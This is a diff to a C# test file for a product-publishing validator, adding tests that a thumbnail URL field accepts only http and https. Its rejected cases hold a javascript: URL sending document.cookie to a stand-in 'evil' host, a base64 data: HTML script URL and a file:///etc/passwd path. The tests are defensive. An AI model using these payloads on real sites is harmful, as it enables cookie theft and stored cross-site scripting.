@@ -29,6 +29,21 @@ public class PublishProductValidatorTests
         Validator.Validate(Valid() with { ThumbnailUrl = null }).IsValid.ShouldBeTrue();
     }
 
+    [Theory]
+    [InlineData("https://cdn.example/desk.jpg")]
+    [InlineData("http://cdn.example/desk.jpg")]
+    [InlineData("HTTPS://CDN.EXAMPLE/desk.jpg")]
+    [InlineData("https://cdn.example/desk.jpg?v=2&size=large")]
+    public void An_http_thumbnail_is_valid(string url)
+    {
+        // The positive half, and it is not decoration: a rule that refused
+        // every URL would pass every negative case in Invalid() while breaking
+        // the field. The upper-case scheme is here because Uri.Scheme
+        // normalises to lower case — a comparison written against the raw text
+        // would refuse a legal URL.
+        Validator.Validate(Valid() with { ThumbnailUrl = url }).IsValid.ShouldBeTrue(url);
+    }
+
     [Fact]
     public void A_zero_amount_is_valid()
     {
@@ -46,6 +61,25 @@ public class PublishProductValidatorTests
         { nameof(PublishProductCommand.Name), Valid() with { Name = "" } },
         { nameof(PublishProductCommand.Name), Valid() with { Name = new string('x', 201) } },
         { nameof(PublishProductCommand.ThumbnailUrl), Valid() with { ThumbnailUrl = new string('x', 401) } },
+        // The scheme cases. This value is stored and served to every reader of
+        // the catalogue (§6.5), and a renderer binding it into an href acts on
+        // whatever scheme it carries — so the length rule alone left stored XSS
+        // one field away from an unauthenticated write.
+        {
+            nameof(PublishProductCommand.ThumbnailUrl),
+            Valid() with { ThumbnailUrl = "javascript:fetch('//evil/'+document.cookie)" }
+        },
+        {
+            nameof(PublishProductCommand.ThumbnailUrl),
+            Valid() with { ThumbnailUrl = "data:text/html;base64,PHNjcmlwdD4=" }
+        },
+        // A scheme this platform simply has no use for, so the rule is an
+        // allow-list of two rather than a deny-list of the ones thought of.
+        { nameof(PublishProductCommand.ThumbnailUrl), Valid() with { ThumbnailUrl = "file:///etc/passwd" } },
+        // Relative: no scheme to refuse, and nothing here serves an origin the
+        // catalogue's images would be relative to.
+        { nameof(PublishProductCommand.ThumbnailUrl), Valid() with { ThumbnailUrl = "/images/desk.jpg" } },
+        { nameof(PublishProductCommand.ThumbnailUrl), Valid() with { ThumbnailUrl = "not a url at all" } },
         { nameof(PublishProductCommand.Amount), Valid() with { Amount = -0.01m } },
         // decimal(19,4)'s integer capacity — past it the write fails at
         // SaveChanges as a 500, which is the wrong blame for bad input.
